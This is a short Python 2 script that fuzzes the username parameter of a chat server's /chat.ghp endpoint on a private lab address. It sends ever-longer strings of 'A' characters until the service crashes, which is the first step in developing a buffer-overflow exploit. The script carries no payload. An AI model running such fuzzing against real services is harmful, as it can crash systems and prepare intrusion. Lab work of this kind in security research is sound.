#!/usr/bin/python

import socket 
import sys
from time import sleep



fuzz = 'A' * 100

buffer = 'GET /chat.ghp?username=' + fuzz + '&password=test&room=1&sex=1 HTTP/1.1\r\n\r\n'
buffer += 'Host: 192.168.0.134\r\n\r\n'  

while True:
  try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.134',80))
    print '[*] Fuzzing username with buffer length: ' + str(len(fuzz))
    s.send(buffer)
    s.close()
    sleep (1)
    buffer = 'GET /chat.ghp?username=' + fuzz + '&password=test&room=1&sex=2 HTTP/1.1\r\n'
    buffer += 'Host: 192.168.0.134\r\n\r\n'
    fuzz += 'A' * 100 
    
  except:
    print '[*] Crash occurred at buffer length: ' + str(len(fuzz)-50)
    sys.exit()